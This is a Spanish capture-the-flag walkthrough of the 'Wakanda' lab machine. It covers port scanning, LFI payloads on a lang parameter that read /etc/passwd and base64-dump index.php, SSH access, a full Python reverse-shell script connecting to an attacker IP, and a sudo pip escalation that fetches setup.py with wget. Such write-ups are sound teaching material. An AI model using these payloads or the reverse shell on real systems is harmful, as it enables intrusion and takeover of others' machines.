---
description: '✍️ Autor: xMagass🔍 Dificultad: Intermedio📅 Fecha de creación: 05/08/2019'
---

# Wakanda

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.60
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 192.168.1.60 -oG allPorts
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo, los puertos 80, 111, 3333 y 35263 están abiertos. El **puerto 80** pertenece al servicio **HTTP**, lo que indica la presencia de un servidor web. El **puerto 111** está asociado con el servicio **rpcbind**, comúnmente utilizado para gestionar servicios RPC (Remote Procedure Call). El **puerto 3333** corresponde al servicio **dec-notes**, mientras que el **puerto 35263** está identificado como un servicio **desconocido**.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p80,111,3333,35263 -v 192.168.1.60
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora exploramos el servicio **HTTP**. Se ingresó la dirección IP en el navegador, lo que llevó a que la página web sobre una página de una tienda de Vibranium.

<figure><img src="../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos directorios con la herramienta **Gobuster** a través de:&#x20;

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml,js -u http://192.168.1.60
```

<figure><img src="../../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

Vemos que hay un archivo `secret.txt` por lo que accederemos a él aunque no hay nada interesante solo nos estaban vacilando. También  muchos directorios tienen **tamaño 0** así seguimos indagando.

<figure><img src="../../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos exploits con la herramienta **Searchsploit** a través de:&#x20;

```
searchsploit rpcbind
```

<figure><img src="../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

No obtenemos algo relevante por lo que probamos indagar **SSH**. No tuvimos suerte probando contraseñas comunes.

```bash
ssh -p 3333 root@192.168.1.60
```

<figure><img src="../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>

Revisamos el código fuente por si hay alguna información relevante que se nos haya escapado.

<figure><img src="../../.gitbook/assets/image (114).png" alt=""><figcaption></figcaption></figure>

Hay una sección de código comentada que incluye un parámetro `?lang=fr`, que probablemente se utiliza para cambiar el idioma a francés. Vamos a probar esto.

```markdown
http://192.168.1.60/?lang=fr
```

<figure><img src="../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Una vez que el texto se ha convertido correctamente al francés, procederemos a verificar si el parámetro `lang` es vulnerable a la inclusión de archivos locales (LFI), con el objetivo de acceder al archivo `index.php`. Para obtener más información y técnicas sobre cómo realizar este tipo de pruebas, puedes consultar la siguiente página: [Guía sobre Inclusión de Archivos](https://book.hacktricks.xyz/pentesting-web/file-inclusion?source=post\_page-----3e7d06c3c913--------------------------------).

```bash
http://192.168.1.60/?lang=../../../etc/passwd
http://192.168.1.60/?lang=....//....//....//etc/passwd
http://192.168.1.60/?lang=php://filter/read=string.toupper|string.rot13|string.tolower/resource=index.php
http://192.168.1.60/?lang=php://filter/convert.base64-encode/resource=index.php
```

Después de numerosos intentos, logramos explotar la vulnerabilidad de inclusión de archivos locales (LFI) utilizando la función `php://filter/convert.base64-encode/resource=index`, lo que nos permitió acceder a la página de índice.

```markdown
http://192.168.1.60/?lang=php://filter/convert.base64-encode/resource=index
```

<figure><img src="../../.gitbook/assets/image (116).png" alt=""><figcaption></figcaption></figure>

Creamos un archivo utilizando la cadena codificada y luego procedemos a decodificarlo empleando un decodificador Base64.

<figure><img src="../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (118).png" alt=""><figcaption></figcaption></figure>

Al decodificar la cadena codificada en **Base64**, descubrimos la contraseña la cual, junto con la información de que **mamadou** es el autor, nos permite iniciar sesión a través de SSH en la máquina objetivo.

```markdown
ssh mamadou@192.168.1.60 -p 3333
```

<figure><img src="../../.gitbook/assets/image (119).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al acceder, obtenemos un aviso del IDE de Python. Para cambiar a un shell Bash, importamos el módulo `pty` y lanzamos un shell de `/bin/bash`.

```python
import pty
pty.spawn('/bin/bash')
```

<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

Esta es la primera flag pero nos faltan dos.

<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

Sin embargo, no podemos acceder al archivo porque está propiedad de otro usuario llamado `devops`. Necesitamos elevar nuestros privilegios al usuario `devops` para poder acceder al archivo.

Primero, examinemos los tipos de usuarios presentes en el sistema.

```bash
cat /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

Para escalar privilegios, debemos identificar un archivo que sea propiedad del grupo `devops` y que pueda ser ejecutado por el usuario `mamadou`. Si existe tal archivo, podríamos usarlo para elevar nuestros privilegios.

Primero, obtengamos información sobre el sistema:

```bash
uname -a
```

<figure><img src="../../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>

Ahora, busquemos todos los archivos que sean propiedad del usuario `devops`.

```bash
find / -user devops
```

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

Hemos encontrado un archivo interesante llamado `/srv/.antivirus.py` al que podemos acceder, además de los archivos que ya hemos encontrado. Procedamos con su análisis.

Editamos el archivo `".antivirus.py"` para que contenga lo siguiente:

```python
with open('/tmp/test', 'w') as f:
    with open('/home/devops/flag2.txt', 'r') as source_file:
        f.write(source_file.read())
```

Hicimos un intento de modificar el script de Python para acceder a `flag2.txt`, pero actualmente no tenemos los permisos necesarios para el directorio `/tmp/test`.

<figure><img src="../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

Sin embargo, dado que podemos ejecutar el script con éxito, procederemos a intentar una shell reversa en Python.

```python
# -*- coding: utf-8 -*-

import socket
import subprocess
import os

# IP de tu máquina atacante
ATTACKER_IP = "192.168.1.58"
# Puerto en el que tu máquina atacante está escuchando
ATTACKER_PORT = 1234

# Crea un socket para la conexión
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Conéctate a la IP y puerto del servidor atacante
s.connect((ATTACKER_IP, ATTACKER_PORT))

# Redirige las entradas y salidas estándar del proceso a través del socket
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Llama a /bin/sh para abrir una shell interactiva
subprocess.call(["/bin/sh", "-i"])
```

<figure><img src="../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

El script se ejecutó con éxito, pero solo obtuvimos conexiones como el usuario `mamadou`. Es posible que el script se ejecute automáticamente como un trabajo cron bajo el usuario `devops`. Vamos a esperar un breve periodo de tiempo mientras escuchamos las conexiones.

<figure><img src="../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

Al ejecutar el script, obtuvimos una shell reversa. Es probable que un crontab o un cronjob sea el responsable de esta ejecución.

Hemos conseguido nuestra segunda bandera. Ahora, para obtener la bandera de **root**, necesitamos escalar nuestros privilegios nuevamente para convertirnos en usuario **root**.

Primero, verifiquemos los permisos que tenemos como usuario `devops` con el siguiente comando:

```bash
sudo -l
```

<figure><img src="../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

El comando `pip` actúa como un gestor de paquetes de Python. Vamos a aprovechar una vulnerabilidad en `pip`.

Existen scripts como `Fakepip` que se pueden utilizar para explotar esta vulnerabilidad. Puedes encontrar el script `FakePip` en el siguiente [repositorio de GitHub](https://github.com/0x00-0x00/FakePip).

Para transferir el archivo `setup.py` al equipo objetivo, sigue estos pasos:

**En la máquina local**

1.  Copia el archivo `setup.py` al directorio raíz del servidor web Apache:

    ```bash
    cp setup.py /var/www/html
    ```
2.  Inicia el servicio Apache:

    ```bash
    service apache2 start
    ```
3.  Abre un puerto para escuchar conexiones entrantes en la máquina local:

    ```bash
    nc -lnvp 13372
    ```

**En la máquina objetivo**

1.  Descarga el archivo `setup.py` desde el servidor Apache:

    ```bash
    wget http://192.168.1.2/setup.py
    ```
2.  Instala el archivo usando `pip`, asegurándote de forzar la reinstalación y actualización:

    ```bash
    sudo /usr/bin/pip install . --upgrade --force-reinstall
    ```

<figure><img src="../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

Hemos **completado con éxito** todas las etapas del proceso y **cumplido con todos los requisitos**.
